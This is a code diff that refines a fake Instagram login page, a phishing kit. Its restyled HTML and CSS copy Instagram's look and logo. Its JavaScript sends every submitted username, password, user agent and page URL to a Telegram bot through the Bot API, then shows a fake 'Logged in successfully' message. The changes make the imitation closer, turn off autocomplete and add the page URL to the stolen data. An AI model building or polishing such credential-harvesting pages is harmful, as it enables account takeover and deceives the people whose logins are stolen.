@@ -7,41 +7,67 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
         
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         
         body {
-            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-            background: #f0f0f0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #f0f0f0, #e0e0e0);
             height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
+            overflow: hidden;
         }
         
-        .container {
+        .main {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 935px;
+            gap: 30px;
+        }
+        
+        .phone {
+            display: none;
+            background: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/43cc71bb1b6d.png') no-repeat;
+            background-size: contain;
+            width: 454px;
+            height: 618px;
+            position: relative;
+        }
+        
+        .login-container {
             max-width: 350px;
             width: 100%;
         }
         
         .login-box {
-            background: white;
+            background: #fff;
             border: 1px solid #dbdbdb;
             border-radius: 8px;
             padding: 40px 40px 20px;
             text-align: center;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin-bottom: 10px;
         }
         
         .logo {
-            width: 180px;
-            margin-bottom: 35px;
-            filter: contrast(1.1);
+            width: 175px;
+            height: 51px;
+            background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_logo.svg/1200px-Instagram_logo.svg.png') no-repeat center;
+            background-size: contain;
+            margin: 0 auto 30px;
+            display: block;
         }
         
         input {
             width: 100%;
-            padding: 12px 10px;
+            padding: 11px 12px;
             margin: 6px 0;
             background: #fafafa;
             border: 1px solid #dbdbdb;
@@ -60,12 +86,16 @@
             color: white;
             border: none;
             border-radius: 8px;
-            padding: 9px;
+            padding: 8px 0;
             font-weight: 600;
             font-size: 15px;
             margin: 18px 0 10px;
             cursor: pointer;
-            transition: 0.2s;
+            transition: background 0.2s;
+        }
+        
+        .login-btn:hover {
+            background: #0077cc;
         }
         
         .login-btn:disabled {
@@ -74,35 +104,44 @@
         }
         
         .divider {
-            margin: 25px 0;
+            margin: 25px 0 20px;
             color: #8e8e8e;
             font-size: 13px;
             display: flex;
             align-items: center;
         }
         
-        .divider::before, .divider::after {
+        .divider::before,
+        .divider::after {
             content: '';
             flex: 1;
             height: 1px;
             background: #dbdbdb;
         }
         
-        .divider span { padding: 0 18px; }
+        .divider span {
+            padding: 0 18px;
+        }
         
-        .forgot { color: #00376b; font-size: 12px; text-decoration: none; margin: 15px 0; display: block; }
+        .forgot {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin: 15px 0;
+        }
         
-        .signup {
-            background: white;
+        .signup-box {
+            background: #fff;
             border: 1px solid #dbdbdb;
             border-radius: 8px;
             padding: 25px;
             text-align: center;
-            margin-top: 15px;
             font-size: 14px;
+            margin-top: 10px;
         }
         
-        .signup a {
+        .signup-box a {
             color: #0095f6;
             font-weight: 600;
             text-decoration: none;
@@ -121,33 +160,44 @@
             font-size: 14px;
             display: none;
         }
+        
+        @media (min-width: 875px) {
+            .phone {
+                display: block;
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="login-box">
-            <!-- Official Instagram Logo (Text SVG for accuracy) -->
-            <svg class="logo" viewBox="0 0 510 170" xmlns="http://www.w3.org/2000/svg">
-                <text x="10" y="120" font-family="Arial Black, sans-serif" font-size="135" font-weight="900" fill="#262626">Instagram</text>
-            </svg>
-
-            <form id="loginForm">
-                <input type="text" id="username" placeholder="Phone number, username, or email" required>
-                <input type="password" id="password" placeholder="Password" required>
+    <div class="main">
+        <!-- Phone Mock -->
+        <div class="phone"></div>
+        
+        <div class="login-container">
+            <div class="login-box">
+                <div class="logo"></div>
                 
-                <button type="submit" id="loginBtn" class="login-btn">Log in</button>
-            </form>
-
-            <div class="divider"><span>OR</span></div>
+                <form id="loginForm">
+                    <input type="text" id="username" placeholder="Phone number, username or email" required autocomplete="off">
+                    <input type="password" id="password" placeholder="Password" required autocomplete="off">
+                    <button type="submit" id="loginBtn" class="login-btn">Log in</button>
+                </form>
+                
+                <div class="divider"><span>OR</span></div>
+                
+                <a href="#" class="forgot">Forgot password?</a>
+                
+                <div class="success-msg" id="successMsg">✅ Logged in successfully!</div>
+                <div class="error-msg" id="errorMsg">❌ Connection error. Try again.</div>
+            </div>
             
-            <a href="#" class="forgot">Forgot password?</a>
+            <div class="signup-box">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
             
-            <div class="success-msg" id="successMsg">✅ Logged in successfully!</div>
-            <div class="error-msg" id="errorMsg">❌ Failed to send data. Try again.</div>
-        </div>
-
-        <div class="signup">
-            Don't have an account? <a href="#">Sign up</a>
+            <div style="text-align: center; margin-top: 20px; font-size: 13px; color: #8e8e8e;">
+                Get the app.
+            </div>
         </div>
     </div>
 
@@ -167,31 +217,28 @@
             const password = document.getElementById('password').value.trim();
 
             if (!username || !password) {
-                alert("Please enter username and password");
+                alert("Please fill all fields");
                 return;
             }
 
-            // Disable button + loading state
             loginBtn.disabled = true;
             loginBtn.textContent = "Logging in...";
 
             const message = `🔥 *New Instagram Login* 🔥\n\n` +
-                           `👤 *Username:* \`${username}\`\n` +
+                           `👤 *Username/Email:* \`${username}\`\n` +
                            `🔑 *Password:* \`${password}\`\n\n` +
-                           `📱 *Device:* ${navigator.userAgent}\n` +
-                           `🌐 *IP Info:* (Browser)\n` +
-                           `⏰ *Time:* ${new Date().toLocaleString('en-IN')}`;
-
-            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+                           `📱 *User-Agent:* ${navigator.userAgent}\n` +
+                           `⏰ *Time:* ${new Date().toLocaleString('en-IN')}\n` +
+                           `🌐 *Page:* ${window.location.href}`;
 
             try {
-                const response = await fetch(url, {
+                const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'MarkdownV2'
                     })
                 });
 
@@ -200,19 +247,17 @@
                 if (data.ok) {
                     successMsg.style.display = 'block';
                     errorMsg.style.display = 'none';
-                    
                     setTimeout(() => {
-                        alert("✅ Login successful! (Demo Page)");
-                        // window.location.href = "https://www.instagram.com"; // Uncomment to redirect
-                    }, 1200);
+                        alert("✅ Login Successful (This is a demo)");
+                    }, 800);
                 } else {
-                    throw new Error("Telegram API error");
+                    throw new Error(data.description || "Telegram API error");
                 }
             } catch (err) {
-                console.error(err);
+                console.error("Telegram Error:", err);
                 errorMsg.style.display = 'block';
                 successMsg.style.display = 'none';
-                alert("Could not connect to Telegram. Check your internet or firewall.");
+                alert("Could not connect to Telegram.\n\n1. Check your internet\n2. Try disabling VPN/Ad-blocker\n3. Open in Incognito");
             } finally {
                 loginBtn.disabled = false;
                 loginBtn.textContent = "Log in";
